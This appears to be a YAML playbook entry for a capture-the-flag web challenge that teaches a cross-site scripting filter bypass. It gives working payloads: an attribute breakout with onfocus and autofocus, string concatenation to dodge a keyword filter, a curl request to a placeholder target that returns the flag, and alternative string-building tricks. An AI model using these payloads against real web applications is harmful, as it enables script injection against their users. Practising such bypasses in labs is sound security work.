name: xss_string_concatenation_bypass
category: web
tags: [xss, string_concatenation, filter_bypass, onfocus]
indicators:
  - "Specific string pattern filtered (e.g., 'XSS')"
  - "User input in HTML attribute value"
  - "Script tag filtering"
  - "Regex-based string removal"

tricks:
  - name: "Step 1: Identify filter rules"
    when: "Found XSS input point"
    how: "Analyze what gets filtered"
    payload: |
      # Filter: ["']XSS["'] is removed
      # 'XSS' or "XSS" will be deleted
      # <script> tags also removed
      # Input placed in: value="USER_INPUT"

  - name: "Step 2: Use string concatenation"
    when: "Specific string blocked"
    how: "Split the string and concatenate in JS"
    payload: |
      # Instead of alert('XSS')
      # Use: alert('X'+'SS')
      # JS concatenates at runtime, bypassing filter

  - name: "Step 3: Craft payload with onfocus"
    when: "Can break out of value attribute"
    how: "Close value and add event handler"
    payload: |
      test" onfocus=alert('X'+'SS') autofocus x="
      # Results in: value="test" onfocus=alert('X'+'SS') autofocus x=""
      # autofocus triggers onfocus immediately

  - name: "Step 4: Trigger XSS and get flag"
    when: "Execute attack"
    how: "Send payload via name parameter"
    payload: |
      curl "http://TARGET/page?name=test%22%20onfocus=alert('X'%2B'SS')%20autofocus%20x=%22"
      # Response: Congratulations! Here is the flag: flag{...}

  - name: "Alternative: Other concatenation methods"
    when: "Need variations"
    how: "Try different string building techniques"
    payload: |
      # Template literals: alert(`X${'SS'}`)
      # Array join: alert(['X','SS'].join(''))
      # String.fromCharCode: alert(String.fromCharCode(88,83,83))

